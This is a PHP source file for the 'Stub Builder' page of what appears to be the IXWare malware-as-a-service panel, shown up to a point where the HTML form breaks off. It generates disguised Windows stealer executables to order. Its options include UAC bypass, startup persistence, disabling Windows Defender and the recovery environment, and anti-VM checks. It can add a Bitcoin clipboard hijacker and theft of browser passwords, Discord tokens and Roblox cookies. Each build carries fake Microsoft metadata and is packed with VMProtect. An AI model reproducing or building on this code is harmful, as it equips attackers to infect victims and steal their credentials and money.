<?php 
      @session_start();
      $title = 'Stub Builder';
      include_once 'includes/layout/header.php';
      include_once 'includes/checks.php';    
      include_once __DIR__.'/../vendor/autoload.php';

      $getRank = pdoQuery($db, "SELECT `rank` FROM `users` WHERE `id`=?", [htmlspecialchars($_SESSION['ID'])])->fetchColumn();
      $discordID = pdoQuery($db, "SELECT `discordID` FROM `users` WHERE `id`=?", [htmlspecialchars($_SESSION['ID'])])->fetchColumn();
      $banned = pdoQuery($db, "SELECT `banned` FROM `users` WHERE `id`=?", [htmlspecialchars($_SESSION['ID'])])->fetchColumn(0);
      
      if($banned != 0){
          
          header("location: support");
          exit();
      }
      if(checkMaintenance() == 'Maintenance' && $getRank != "Admin"){
        header('Location: dashboard');
        die();
      }

      if($getRank != "Premium"){
        if($getRank != "Admin"){
          header('Location: dashboard');
          die();
        }
      }
       
      if($discordID == 0){
        header('Location: settings?id');
        die();
      }
      if(isset($_SESSION['username'])){
        $username = htmlspecialchars($_SESSION['username']);
      }else{
        $username = "Unknown";
      }
?>

<?php
   if (isset($_POST['build'])){

    if (\Volnix\CSRF\CSRF::validate($_POST)) {

      if (empty($_POST['ToSCheck'])){
        $error = 'You need to agree to the Terms of Service!';
      }
  
      $str=file_get_contents('stub\stubFiles\1-0-0.cs');
  
      $str=str_replace('#UID', htmlspecialchars($_SESSION['ID']), $str);
      if (!empty($_POST['winStartup'])){
        $str=str_replace('#startup', 'true', $str);
      }else{
        $str=str_replace('#startup', 'false', $str);
      }
      if (!empty($_POST['uacBypass'])){
        $str=str_replace('#bypass', 'true', $str);
      }else{
        $str=str_replace('#bypass', 'false', $str);
      }
      if (!empty($_POST['critical'])){
        $str=str_replace('#critical', 'true', $str);
      }else{
        $str=str_replace('#critical', 'false', $str);
      }
      if (!empty($_POST['hiddenFile'])){
        $str=str_replace('#hiddenFile', 'true', $str);
      }else{
        $str=str_replace('#hiddenFile', 'false', $str);
      }
      if (!empty($_POST['antiVM'])){
        $str=str_replace('#antiVM', 'true', $str);
      }else{
        $str=str_replace('#antiVM', 'false', $str);
      }
      if (!empty($_POST['websiteBlocker'])){
        $str=str_replace('#wBlocker', 'true', $str);
        $str=str_replace('#websitesToBlock', htmlspecialchars($_POST['blockSite']), $str);
      }else{
        $str=str_replace('#wBlocker', 'false', $str);
      }
      if (!empty($_POST['processBlocker'])){
        $str=str_replace('#pBlocker', 'true', $str);
  
        if(strpos(htmlspecialchars($_POST['blockProgram']), '.exe')){
          $str=str_replace('#programsToBlock', htmlspecialchars($_POST['blockProgram']), $str);
        }else{
          $error = "Please add '.exe' to your given programs.";
        }
      }else{
        $str=str_replace('#pBlocker', 'false', $str);
      }
      if (!empty($_POST['corePWRecovery'])){
        $str=str_replace('#pwRecovery', 'true', $str);
      }else{
        $str=str_replace('#pwRecovery', 'false', $str);
      }
      if (!empty($_POST['tokenRecovery'])){
        $str=str_replace('#tokenRecovery', 'true', $str);
      }else{
        $str=str_replace('#tokenRecovery', 'false', $str);
      }
      if (!empty($_POST['cookieRecovery'])){
        $str=str_replace('#cookieRecovery', 'true', $str);
      }else{
        $str=str_replace('#cookieRecovery', 'false', $str);
      }
      //--------ASMINFOS---------//
      if (!empty($_POST['asmTitle'])){
        $str=str_replace('#title', htmlspecialchars($_POST['asmTitle']), $str);
      }else{
        $str=str_replace('#title', 'Microsoft Corporation', $str);
      }
      if (!empty($_POST['asmDescription'])){
        $str=str_replace('#description', htmlspecialchars($_POST['asmDescription']), $str);
      }else{
        $str=str_replace('#description', 'Microsoft', $str);
      }
      if (!empty($_POST['asmFileVersion'])){
        $str=str_replace('#version', htmlspecialchars($_POST['asmFileVersion']), $str);
      }else{
        $str=str_replace('#version', '16.0.12430.20184', $str);
      }
      if (!empty($_POST['asmCompany'])){
        $str=str_replace('#company', htmlspecialchars($_POST['asmCompany']), $str);
      }else{
        $str=str_replace('#company', 'Microsoft Corporation', $str);
      }
      if (!empty($_POST['asmProduct'])){
        $str=str_replace('#product', htmlspecialchars($_POST['asmProduct']), $str);
      }else{
        $str=str_replace('#product', '16.0.12430.20184', $str);
      }
      if (!empty($_POST['asmCopyright'])){
        $str=str_replace('#copyright', htmlspecialchars($_POST['asmCopyright']), $str);
      }else{
        $date = date('Y');
        $str=str_replace('#copyright', "© Microsoft $date", $str);
      }
      if (!empty($_POST['asmTrademark'])){
        $str=str_replace('#trademark', htmlspecialchars($_POST['asmTrademark']), $str);
      }else{
        $str=str_replace('#trademark', "Microsoft\xAE is a registered trademark of Microsoft Corporation.", $str);
      }
      //-----ASM INFO END-----//
      if (!empty($_POST['singleInstance'])){
        $str=str_replace('#singleInstance', 'true', $str);
      }else{
        $str=str_replace('#singleInstance', 'false', $str);
      }
      if (!empty($_POST['notification'])){
        $str=str_replace('#activate', 'true', $str);
  
        if(!empty($_POST['notificationCaption']) && !empty($_POST['notificationMain'])){
          $str=str_replace('#caption', htmlspecialchars($_POST['notificationCaption']), $str);
          $str=str_replace('#Main', htmlspecialchars($_POST['notificationMain']), $str);
        }else{
          $error = "Please enter a caption and a main notification message if you enable notifications.";
        }
      }else{
        $str=str_replace('#activate', 'false', $str);
      }
      if (!empty($_POST['disableWD'])){
        $str=str_replace('#disableWD', 'true', $str);
      }else{
        $str=str_replace('#disableWD', 'false', $str);
      }
      if (!empty($_POST['disableRE'])){
        $str=str_replace('#disableRE', 'true', $str);
      }else{
        $str=str_replace('#disableRE', 'false', $str);
      }
      
      if (!empty($_POST['clipper'])){
        $str=str_replace('#clipper', 'true', $str);
  
        if(!empty($_POST['address'])){
          $str=str_replace('#btcAddress', $_POST['address'], $str);
        }else{
          $error = "Please enter a valid bitcoin address.";
        }
      }else{
        $str=str_replace('#clipper', 'false', $str);
      }
  
      if (empty(htmlspecialchars($_POST['fileName']))){
        $error = 'Please provide a valid stub name!';
      }
      if (strlen(htmlspecialchars($_POST['fileName'])) > 130){
          $error = 'Stub Name is too long!';
      }
      if (strlen(htmlspecialchars($_POST['notificationCaption'])) > 130){
        $error = 'Notification Caption is too long!';
      }
      if (strlen(htmlspecialchars($_POST['notificationMain'])) > 130){
        $error = 'Notification message is too long!';
      }
      if (preg_match('/[\'^£$%&*()}{@#~?><>,|=_+¬-]/', htmlspecialchars($_POST['fileName']))){
          $error = 'Please provide a valid stub name!';
      }
      if(strpos(htmlspecialchars($_POST['fileName']), ".")){
        $error = "Please don't include a dot in the filename.";
      }
      $stubName = htmlspecialchars($_POST['fileName']) . '.exe';
      $stubName = escapeshellcmd($stubName);
      if (preg_match('/\s/', $stubName)){
          $error = "Whitespace in StubName doesn't work!";
      }
  
      if (empty($error)){
  
        $cs = getID(20) . '.cs';
        $zipname = getID(20) . '.zip';
        file_put_contents("stub\\stubFiles\\$cs", $str);
  
        if(!empty($_POST['useIcon'])){
  
          if(!empty($_FILES['icon']['name'])){
            $id = getID(20);
            $errors= array();
            $file_size = $_FILES['icon']['size'];
            $file_tmp = $_FILES['icon']['tmp_name'];
            $file_type= $_FILES['icon']['type'];
            $tmp = explode('.', $_FILES['icon']['name']);
            $file_ext = htmlspecialchars(end($tmp));
            $file_name = "$id.$file_ext";
      
            $fileAccepted = checkFileExtensionBuilder($file_ext);
      
            if($fileAccepted == 1){
              if($file_size < 8000000){
      
                move_uploaded_file($file_tmp,"resources/icons/$file_name");
              }else{
                $error = "File is >8 MB.";
              }
            }else{
              $error = "File Type '$file_ext' not allowed.";
            }
      
            if(empty($error)){
              if(@exif_imagetype("resources/icons/$file_name")){
                exec("stub\\stubFiles\\roslyn\\csc.exe /target:winexe /optimize+ /platform:anycpu /win32icon:resources/icons/$file_name /r:System.dll,System.Windows.Forms.dll,System.Core.dll,System.Management.dll,System.ServiceProcess.dll,System.Security.dll,System.Data.dll,System.Net.Http.dll,System.Text.RegularExpressions.dll,Microsoft.VisualBasic.dll,System.Drawing.dll,System.IO.dll,System.IO.Compression.dll,System.IO.Compression.FileSystem.dll /out:stub\\stubFiles\\Stubs\\$stubName stub\\stubFiles\\$cs 2>&1", $output);
              } else {
                $error = "Icon is not a valid icon.";
              }
            }else{
              $error = $error;
            }
          }else{
            $error = "Please select a file";
          }
        }else{
          exec("stub\\stubFiles\\roslyn\\csc.exe /target:winexe /optimize+ /platform:anycpu /r:System.dll,System.Windows.Forms.dll,System.Core.dll,System.Management.dll,System.ServiceProcess.dll,System.Security.dll,System.Data.dll,System.Net.Http.dll,System.Text.RegularExpressions.dll,Microsoft.VisualBasic.dll,System.Drawing.dll,System.IO.dll,System.IO.Compression.dll,System.IO.Compression.FileSystem.dll /out:stub\\stubFiles\\Stubs\\$stubName stub\\stubFiles\\$cs 2>&1", $output);
        }
  
        if(empty($error)){
          if (strpos(implode($output), 'All rights reserved.') !== false){
  
            $vmp = getID(20) . '.vmp';
            $confuser=file_get_contents('stub\\stubFiles\\1-0-0.vmp');
            $confuser=str_replace('#exe', "Stubs\\$stubName", $confuser);
            $confuser=str_replace('#icksde', "Stubs\\$stubName.vmp", $confuser);
            file_put_contents("stub\\stubFiles\\$vmp", $confuser);
  
            exec("stub\\stubFiles\\vmp\\VMProtect_Con.exe stub\\stubFiles\\Stubs\\$stubName -pf stub\\stubFiles\\$vmp 2>&1", $output);
            if (strpos(implode($output), 'completed') !== false){
              
              if(file_exists("stub\\stubFiles\\$cs")){
                unlink("stub\\stubFiles\\$cs");
              }else{
                $error = "An error occured [3]";
              }
              if(file_exists("stub\\stubFiles\\$vmp")){
                unlink("stub\\stubFiles\\$vmp");
              }else{
                $error = "An error occured [4]";
              }

              if(!empty($_POST['useIcon'])){
                unlink("resources/icons/$file_name");
              }
              if(file_exists("stub\\stubFiles\\Stubs\\$stubName")){
                $str=str_replace('.exe', '.vmp.exe', "stub\\stubFiles\\Stubs\\$stubName");
                rename($str, "stub\\stubFiles\\Stubs\\$stubName");
              }else{
                $error = "An error occured [5]";
              }
  
              if(empty($error)){
                $zip = new ZipArchive();
                if ($zip->open("stub\\stubFiles\\Stubs\\$zipname", ZipArchive::CREATE) === TRUE) {
                    $zipPW = getID(30);
                    $zip->addFile("stub\\stubFiles\\Stubs\\$stubName", basename("stub\\Stubs\\$stubName"));
                    $zip->setEncryptionName($stubName, ZipArchive::EM_AES_256, $zipPW);
                    $zip->close();
                    unlink("stub\\stubFiles\\Stubs\\$stubName");
    
                    if(filesize("stub\\stubFiles\\Stubs\\$zipname") < 100000){
                      unlink("stub\\stubFiles\\Stubs\\$zipname");
                      $error = "An error occured, please try again.";
                    }
                    if(empty($error)){
                      $PDOLog = $db -> prepare('INSERT INTO `stub_logs` VALUES(:user, :stubname, :zipname, :download, :pw, :date)');
                      $PDOLog -> execute(array(':user' => $_SESSION['username'], ':stubname' => $stubName, ':zipname' => $zipname, ':download' => "https://ixwhere.online/stub/stubFiles/Stubs/$zipname", ':pw' => $zipPW, ':date' => date("Y-m-d H:i:s")));
      
                      $_SESSION['stubName'] = $stubName;
                      $_SESSION['stubDL'] = "https://ixwhere.online/stub/stubFiles/Stubs/$zipname";
                      $_SESSION['stubPW'] = $zipPW;
                      logUser($_SESSION['ID'], $_SESSION['username'], "Built a stub");
                    }
                }
              }
            }
          }
        }
      }else{
        $error = "hii";
      }
    }else{
      header("HTTP/1.1 401 Unauthorized");
      echo file_get_contents('includes/layout/error/401.php');
      die();
    }
   }
?>

  <body class="bg-dark">
  <!--Main Navigation-->
  <header>
    <!-- Sidenav -->
    <nav id="sidenav-1" class="sidenav bg-dark" data-hidden="false" data-accordion="true">
      <a class="ripple d-flex justify-content-center py-4" href="#!" data-ripple-color="primary">
        <img id="IXWARE Logo" src="resources/img/ixwarelogogif.gif" alt="IX Logo" draggable="false" style="width: 170px;" />
      </a>

      <ul class="sidenav-menu">
        <li class="sidenav-item ml-4 mt-2 mb-1 text-white">
          <span>General</span>
        </li>
        <li class="sidenav-item">
          <a class="sidenav-link" href="dashboard">
            <i class="fas fa-tachometer-slow fa-fw mr-3"></i><span>Dashboard</span>
          </a>
        </li> 
        <?php
          if ($getRank == "User" || $getRank == "Admin"){
            echo "<li class='sidenav-item'>
            <a class='sidenav-link' href='purchase'>
              <i class='fas fa-shopping-basket fa-fw mr-3'></i><span>Purchase</span>
            </a>
          </li>";
          }
        ?>
        <li class="sidenav-item ml-4 mt-4 mb-1 text-white">
          <span>Managing</span>
        </li>
        <li class="sidenav-item">
          <a class="sidenav-link">
            <i class="fas fa-users fa-fw mr-3"></i><span>Bots</span>
          </a>
          <ul class="sidenav-collapse">
            <?php
              if ($getRank == "Premium" || $getRank == "Admin"){
                
                echo "<li class='sidenav-item'>
                 <a class='sidenav-link' href='bots'>Stubs <span class='badge bg-danger ml-2' id='bot-logs'>0</span></a>
                </li>";
                echo "<li class='sidenav-item'>
                <a class='sidenav-link' href='jsBots'>Javascript <span class='badge bg-danger ml-2' id='cookie-logs'>0</span></a>
                </li>";
                echo "<li class='sidenav-item'>
                <a class='sidenav-link' href='psBots'>Phishing <span class='badge bg-danger ml-2' id='ps-logs'>0</span></a>
                </li>";
              }elseif($getRank == "User"){

                echo "<li class='sidenav-item'>
                <a class='sidenav-link' href='jsBots'>Javascript <span class='badge bg-danger ml-2' id='cookie-logs'>0</span></a>
                </li>";
              }
            ?>
          </ul>
        </li>
        <li class="sidenav-item">
          <a class="sidenav-link">
            <i class="fas fa-shield-virus fa-fw mr-3"></i><span>Builder</span>
          </a>
          <ul class="sidenav-collapse">
            <?php
              if ($getRank == "Premium" || $getRank == "Admin"){
                
                echo "<li class='sidenav-item'>
                <a class='sidenav-link active' href='builder'>Stub</a>
                </li>";
                echo "<li class='sidenav-item'>
                <a class='sidenav-link' href='jsBuilder'>Javascript</a>
                </li>";
                echo "<li class='sidenav-item'>
                <a class='sidenav-link' href='psBuilder'>Phishing</a>
                </li>";
                echo "<li class='sidenav-item'>
                <a class='sidenav-link' href='bmBuilder'>Bookmark</a>
                </li>";
              }elseif($getRank == "User"){
                echo "<li class='sidenav-item'>
                <a class='sidenav-link' href='jsBuilder'>Javascript</a>
                </li>";
              }
            ?>
          </ul>
        </li>
        <li class="sidenav-item">
          <a class="sidenav-link">
            <i class="fas fa-file-download fa-fw mr-3"></i><span>Builds</span>
          </a>
          <ul class="sidenav-collapse">
            <?php
              if ($getRank == "Premium" || $getRank == "Admin"){
                
                echo "<li class='sidenav-item'>
                <a class='sidenav-link' href='builds'>Stub</a>
                </li>";
                echo "<li class='sidenav-item'>
                <a class='sidenav-link' href='jsBuilds'>Javascript</a>
                </li>";
                echo "<li class='sidenav-item'>
                <a class='sidenav-link' href='psBuilds'>Phishing</a>
                </li>";
                echo "<li class='sidenav-item'>
                <a class='sidenav-link' href='bmBuilds'>Bookmark</a>
                </li>";
              }elseif($getRank == "User"){
                echo "<li class='sidenav-item'>
                <a class='sidenav-link' href='jsBuilds'>Javascript</a>
                </li>";
              }
            ?>
          </ul>
        </li>
        <li class="sidenav-item">
          <a class="sidenav-link">
            <i class="fas fa-tools fa-fw mr-3"></i><span>Tools</span>
          </a>
          <ul class="sidenav-collapse">
            <li class='sidenav-item'>
              <a class='sidenav-link' href='watchlist'>Watchlist</a>
            </li>
          </ul>
        </li>
        <li class="sidenav-item ml-4 mt-4 mb-1 text-white">
          <span>Account</span>
        </li>
        <li class="sidenav-item">
          <a class="sidenav-link">
            <i class="fas fa-sliders-h fa-fw mr-3"></i><span>Settings</span>
          </a>
          <ul class="sidenav-collapse">
            <li class="sidenav-item">
              <a class="sidenav-link" href="settings">General</a>
            </li>
            <li class="sidenav-item">
              <a class="sidenav-link" href="builder-settings">Builder</a>
             </li>
          </ul>
        </li>
        <li class="sidenav-item">
          <a class="sidenav-link" href="ix-licenses">
            <i class="fab fa-keycdn fa-fw mr-3"#></i><span>Licenses</span>
          </a>
        </li>
        <li class="sidenav-item">
          <a class="sidenav-link" href="support">
            <i class="fas fa-question-circle fa-fw mr-3"#></i><span>Support</span>
          </a>
        </li>
        <li class="sidenav-item">
          <a class="sidenav-link" href="logout">
            <i class="fal fa-sign-out fa-fw mr-3"></i><span>Logout</span>
          </a>
        </li>
      </ul>
    </nav>
    <!-- Sidenav -->

    <!-- Navbar -->
    <nav
      id="main-navbar"
      class="navbar navbar-expand-lg navbar-light fixed-top bg-dark"
    >
      <!-- Container wrapper -->
      <div class="container-fluid">
        <nav aria-label="breadcrumb">
          <ol class="breadcrumb">
            <li class="breadcrumb-item text-white">Stub Builder</li>
          </ol>
        </nav>
        <!-- Toggler -->
        <button
          data-toggle="sidenav"
          data-target="#sidenav-1"
          class="btn shadow-0 p-0 mr-3 d-block d-xxl-none"
          aria-controls="#sidenav-1"
          aria-haspopup="true"
        >
          <i class="fas fa-bars fa-lg"></i>
        </button>

        <!-- Right links -->
        <ul class="navbar-nav ml-auto d-flex flex-row">

          <!-- Icon -->
          <li class="nav-item">
            <a class="nav-link mr-3 mr-lg-0 mt-2 text-white">
              <?= $username ?>
            </a>
          </li>
          <!-- Icon -->
          <li class="nav-item">
            <a class="nav-link mr-3 mr-lg-0 mt-2">
              <?php
                if ($getRank == "User"){
                  echo "<span class='badge bg-light text-dark'>Default</span>";
                }elseif ($getRank == "Admin"){
                  echo "<span class='badge bg-danger'>Administrator</span>";
                }elseif ($getRank == "Premium"){
                  echo "<span class='badge bg-warning text-dark'>Premium</span>";
                }
              ?>
            </a>
          </li>
          <!-- Icon -->
          <li class="nav-item">
            <a class="nav-link mr-3 mr-lg-0">
<?php
		            $getAvatar = pdoQuery($db, "SELECT `avatarURL` FROM `users` WHERE `id`=?", [htmlspecialchars($_SESSION['ID'])])->fetchColumn();
                $av = htmlspecialchars($getAvatar);
                if ($av == '0' || empty($av)){
                  echo "<img src='resources/img/logo.png' class='img-fluid rounded-circle profile-size' alt='' />";
                }else{
                  echo "<img src='$av' class='img-fluid rounded-circle profile-size' alt='' />";
                }
              ?>
            </a>
          </li>
        </ul>
      </div>
      <!-- Container wrapper -->
    </nav>
    <!-- Navbar -->
  </header>
  <!--Main Navigation-->


  <!--Main layout-->
  <main style="margin-top: 100px" class="d-flex ml-5 mr-5">
    <div class="container-fluid">
        <div class="row">
            <div class="col-xl-4">
                <div class="card bg-dark">
                  <div class="card-body d-flex flex-column">
                      <ul class="nav md-pills pills-dark pills-secondary nav-justified d-flex flex-column mb-3">
                          <?php
                            if(isset($_SESSION['stubName'])){
                                echo "<li class='nav-item'>
                                <a class='nav-link active btn btn-transparent'>Successfully Built</a>
                                </li>";
                            }else{
                            echo "<li class='nav-item'>
                                <a class='nav-link active btn btn-transparent' data-toggle='tab' href='#delivery' role='tab'>Delivery</a>
                            </li>
                            <li class='nav-item mt-4'>
                                <a class='nav-link btn btn-transparent' data-toggle='tab' href='#installation' role='tab'>Installation</a>
                            </li>
                            <li class='nav-item mt-4'>
                                <a class='nav-link btn btn-transparent' data-toggle='tab' href='#core' role='tab'>Core</a>
                            </li>
                            <li class='nav-item mt-4'>
                                <a class='nav-link btn btn-transparent' data-toggle='tab' href='#logger' role='tab'>Logger</a>
                            </li>
                            <li class='nav-item mt-4'>
                                <a class='nav-link btn btn-transparent' data-toggle='tab' href='#blocker' role='tab'>Blocker</a>
                            </li>
                            <li class='nav-item mt-4'>
                                <a class='nav-link btn btn-transparent' data-toggle='tab' href='#recoveries' role='tab'>Recoveries</a>
                            </li>
                            <li class='nav-item mt-4'>
                                <a class='nav-link btn btn-transparent' data-toggle='tab' href='#assembly' role='tab'>Assembly</a>
                            </li>
                            <li class='nav-item mt-4'>
                                <a class='nav-link btn btn-transparent' data-toggle='tab' href='#builder' role='tab'>Builder</a>
                            </li>";
                            }
                          ?>
                        </ul>
                  </div>
                </div>
            </div>
            <div class="col-xl-8">
                <?php
                    if(!empty($error)){
                        echo '<div class="animated fadeIn ml-3">'.error(htmlspecialchars($error)).'</div>';
                    }
                    if(!empty($success)){
                        echo '<div class="animated fadeIn ml-3">'.success(htmlspecialchars($success)).'</div>';
                    }
                ?>
                <div class="card bg-dark">
                  <div class="card-body d-flex flex-column">
                        <?php
                            if(isset($_SESSION['stubName'])){

                                $value = htmlspecialchars($_SESSION['stubName']);
                                $value1 = htmlspecialchars($_SESSION['stubDL']);
                                $value2 = htmlspecialchars($_SESSION['stubPW']);


                                echo "<p class='font-weight-bolder text-left text-darkwhite'>Successfully built.</p><div class='md-form mt-1'>
                                <p class='text-darkwhite'>Stub Name</p>
                                <input type='text' value='$value' class='form-control text-darkwhite' style='background-color: transparent !important;' disabled>
                                </div><div class='md-form mt-3'>
                                <p class='text-darkwhite'>ZIP Password</p>
                                <input type='text' value='$value2' class='form-control text-darkwhite' style='background-color: transparent !important;' disabled>
                                </div><a href='$value1' class='btn btn-outline-primary waves-effect mt-3' style='width:100%;'>Download</a>";

                                unset($_SESSION['stubName']);
                                unset($_SESSION['stubDL']);
                                unset($_SESSION['stubPW']);
                            }else{
                                echo "<form class='md-form md-form-resized' method='POST' enctype='multipart/form-data'>
                                <div class='tab-content tab-content-resized text-white' id='pills-tabContent'>
                                <div class='tab-pane fade show active' id='delivery' role='tabpanel'>
                                    <!-- Material Select -->
                                    <p class='text-darkwhite'>Delivery Method</p>
                                    <select class='select'>
                                        <option value='1'>Webpanel</option>
                                    </select>
                                  </div>
                                  <div class='tab-pane fade show' id='installation' role='tabpanel'>
                                    <!-- Material Select -->
                                    <p class='text-darkwhite'>Install Location</p>
                                    <select class='select'>
                                        <option value='1'>AppData\Local\Temp</option>
                                    </select>
                                    <!-- Default checkbox -->
                                    <div class='form-check ml-2'>
                                        <input class='form-check-input mt-4' type='checkbox' value='winStartup' id='winStartup' name='winStartup' />
                                        <label class='form-check-label mt-4' for='winStartup'>Startup with windows</label>
                                    </div>
                                    <!-- Material input -->
                                    <div class='md-form mt-5' title='If UAC isn't bypassed then the stub will add itself to the CurrentUser registry.'>
                                      <p class='text-darkwhite'>Startup Key 1 (CurrentUser)</p>
                                      <input type='text' id='startup1' class='form-control text-darkwhite' value='SOFTWARE\Microsoft\Windows\CurrentVersion\Run' style='background-color: transparent !important;' disabled>
                                    </div>
                                    <!-- Material input -->
                                    <div class='md-form mt-3' title='If UAC is bypassed then the stub will add itself to the LocalMachine registry.'>
                                      <p class='text-darkwhite'>Startup Key 2 (LocalMachine)</p>
                                      <input type='text' id='startup1' class='form-control text-darkwhite' value='SOFTWARE\Microsoft\Windows\CurrentVersion\Run' style='background-color: transparent !important;' disabled>
                                    </div>
                                  </div>
                                  <div class='tab-pane fade show' id='core' role='tabpanel'>
                                    <!-- Default checkbox -->
                                    <div class='form-check ml-2'>
                                        <input class='form-check-input mt-2' type='checkbox' value='uacBypass' id='uacBypass' name='uacBypass' />
                                        <label class='form-check-label mt-2' for='uacBypass'>UAC Bypass</label>
                                    </div>
                                    <!-- Default checkbox -->
                                    <div class='form-check ml-2'>
                                        <input class='form-check-input mt-2' type='checkbox' value='critical' id='critical' name='critical' />
                                        <label class='form-check-label mt-2' for='critical'>Critical System Process</label>
                                    </div>
                                    <!-- Default checkbox -->
                                    <div class='form-check ml-2'>
                                        <input class='form-check-input mt-2' type='checkbox' value='hidden' id='hidden' name='hidden' />
                                        <label class='form-check-label mt-2' for='hidden'>Hidden File</label>
                                    </div>
                                    <!-- Default checkbox -->
                                    <div class='form-check ml-2'>
                                        <input class='form-check-input mt-2' type='checkbox' value='antiVM' id='antiVM' name='antiVM' />
                                        <label class='form-check-label mt-2' for='antiVM'>Anti VirtualMachine</label>
                                    </div>
                                    <!-- Default checkbox -->
                                    <div class='form-check ml-2'>
                                        <input class='form-check-input mt-2' type='checkbox' value='singleInstance' id='singleInstance' name='singleInstance' />
                                        <label class='form-check-label mt-2' for='singleInstance'>Single Instance</label>
                                    </div>
                                    <!-- Default checkbox -->
                                    <div class='form-check ml-2'>
                                        <input class='form-check-input mt-2' type='checkbox' value='disableWD' id='disableWD' name='disableWD' />
                                        <label class='form-check-label mt-2' for='disableWD'>Disable WindowsDefender</label>
                                    </div>
                                    <!-- Default checkbox -->
                                    <div class='form-check ml-2'>
                                        <input class='form-check-input mt-2' type='checkbox' value='disableRE' id='disableRE' name='disableRE' />
                                        <label class='form-check-label mt-2' for='disableRE'>Disable Recovery Environment</label>
                                    </div>
                                    <!-- Default checkbox -->
                                    <div class='form-check ml-2'>
                                        <input class='form-check-input mt-5' type='checkbox' value='notification' id='notification' name='notification' />
                                        <label class='form-check-label mt-5' for='notification'>Notification</label>
                                    </div>
                                    <!-- Material input -->
                                    <div class='md-form mt-2'>
                                      <p class='text-darkwhite'>Caption</p>
                                      <input type='text' id='notificationCaption' placeholder='Warning!' name='notificationCaption' class='form-control text-darkwhite' style='background-color: transparent !important;'>
                                    </div>
                                    <!-- Material input -->
                                    <div class='md-form mt-2'>
                                      <p class='text-darkwhite'>Notification Message</p>
                                      <input type='text' id='notificationCaption' placeholder='You are about to install IXWare on your computer!' name='notificationMain' class='form-control text-darkwhite' style='background-color: transparent !important;'>
                                    </div>
                                  </div>
                                  <div class='tab-pane fade show' id='logger' role='tabpanel'>
                                    <!-- Default checkbox -->
                                    <div class='form-check ml-2'>
                                        <input class='form-check-input mt-2' type='checkbox' value='keylogger' id='keylogger' name='coreKeylogger' disabled />
                                        <label class='form-check-label mt-2' for='keylogger'>Core Keylogger</label>
                                    </div>
                                    <!-- Default checkbox -->
                                    <div class='form-check ml-2'>
                                        <input class='form-check-input mt-2' type='checkbox' value='screenshot' id='screenshot' name='screenshotLogger' disabled />
                                        <label class='form-check-label mt-2' for='screenshot'>Screenshot Logger</label>
                                    </div>       
                                    <!-- Default checkbox -->
                                    <div class='form-check ml-2'>
                                        <input class='form-check-input mt-2' type='checkbox' value='clipper' id='clipper' name='clipper' />
                                        <label class='form-check-label mt-2' for='clipper'>Bitcoin Clipper</label>
                                    </div>          
                                    <!-- Material input -->
                                    <div class='md-form mt-5'>
                                      <p class='text-darkwhite'>Bitcoin Address</p>
                                      <input type='text' id='address' name='address' class='form-control text-darkwhite' style='background-color: transparent !important;'>
                                    </div>           
                                  </div>
                                  <div class='tab-pane fade show' id='blocker' role='tabpanel'>
                                    <!-- Default checkbox -->
                                    <div class='form-check ml-2'>
                                        <input class='form-check-input mt-2' type='checkbox' value='websiteBlock' id='websiteBlock' name='websiteBlocker' />
                                        <label class='form-check-label mt-2' for='websiteBlock'>Website Blocker</label>
                                    </div>
                                    <!-- Material input -->
                                    <div class='md-form mt-2'>
                                      <p class='text-darkwhite'>Websites to block seperated by ;</p>
                                      <input type='text' id='blockSite' placeholder='pornhub.com;xnxx.com;google.com' name='blockSite' class='form-control text-darkwhite' style='background-color: transparent !important;'>
                                    </div>
                                    <!-- Default checkbox -->
                                    <div class='form-check ml-2 mt-2'>
                                        <input class='form-check-input mt-2' type='checkbox' value='processBlocker' id='processBlocker' name='processBlocker' />
                                        <label class='form-check-label mt-2' for='processBlocker'>Process Blocker</label>
                                    </div>
                                    <!-- Material input -->
                                    <div class='md-form mt-2'>
                                      <p class='text-darkwhite'>Processes to block seperated by ;</p>
                                      <input type='text' id='blockProgram' placeholder='pornhub.com;xnxx.com;google.com' name='blockProgram' class='form-control text-darkwhite' style='background-color: transparent !important;'>
                                    </div>
                                  </div>
                                  <div class='tab-pane fade show' id='recoveries' role='tabpanel'>
                                    <!-- Default checkbox -->
                                    <div class='form-check ml-2 mt-2'>
                                        <input class='form-check-input mt-2' type='checkbox' value='corePWRecovery' id='corePWRecovery' name='corePWRecovery' />
                                        <label class='form-check-label mt-2' for='corePWRecovery'>Core Password Recovery</label>
                                    </div>
                                    <ul class='mt-3 font-weight-lighter text-darkwhite'>
                                      <li class='text-black text-muted ml-3'>Google Chrome</li>
                                      <li class='text-black text-muted ml-3'>Opera</li>
                                      <li class='text-black text-muted ml-3'>Yandex</li>
                                      <li class='text-black text-muted ml-3'>360 Browser</li>
                                      <li class='text-black text-muted ml-3'>Comodo Dragon</li>
                                      <li class='text-black text-muted ml-3'>CoolNovo</li>
                                      <li class='text-black text-muted ml-3'>SRWare Iron</li>
                                      <li class='text-black text-muted ml-3'>Torch Browser</li>
                                      <li class='text-black text-muted ml-3'>Brave Browser</li>
                                      <li class='text-black text-muted ml-3'>Iridium Browser</li>
                                      <li class='text-black text-muted ml-3'>7Star</li>
                                      <li class='text-black text-muted ml-3'>Amigo</li>
                                      <li class='text-black text-muted ml-3'>CentBrowser</li>
                                      <li class='text-black text-muted ml-3'>Chedot</li>
                                      <li class='text-black text-muted ml-3'>CocCoc</li>
                                      <li class='text-black text-muted ml-3'>Elements Browser</li>
                                      <li class='text-black text-muted ml-3'>Epic Privacy Browser</li>
                                      <li class='text-black text-muted ml-3'>Kometa</li>
                                      <li class='text-black text-muted ml-3'>Orbitum</li>
                                      <li class='text-black text-muted ml-3'>Sputnik</li>
                                      <li class='text-black text-muted ml-3'>uCozMedia</li>
                                      <li class='text-black text-muted ml-3'>Vivaldi</li>
                                      <li class='text-black text-muted ml-3'>Sleipnir 6</li>
                                      <li class='text-black text-muted ml-3'>Citrio</li>
                                      <li class='text-black text-muted ml-3'>Coowon</li>
                                      <li class='text-black text-muted ml-3'>Liebao Browser</li>
                                      <li class='text-black text-muted ml-3'>QIP Surf</li>
                                      <li class='text-black text-muted ml-3'>Edge Chromium</li>
                                  </ul>
                                    <!-- Default checkbox -->
                                    <div class='form-check ml-2 mt-2'>
                                        <input class='form-check-input mt-2' type='checkbox' value='tokenRecovery' id='tokenRecovery' name='tokenRecovery' />
                                        <label class='form-check-label mt-2' for='tokenRecovery'>Discord Token Recovery</label>
                                    </div>
                                    <!-- Default checkbox -->
                                    <div class='form-check ml-2 mt-2'>
                                        <input class='form-check-input mt-2' type='checkbox' value='cookieRecovery' id='cookieRecovery' name='cookieRecovery' />
                                        <label class='form-check-label mt-2' for='cookieRecovery'>Roblox Cookie Recovery</label>
                                    </div>
                                  </div>
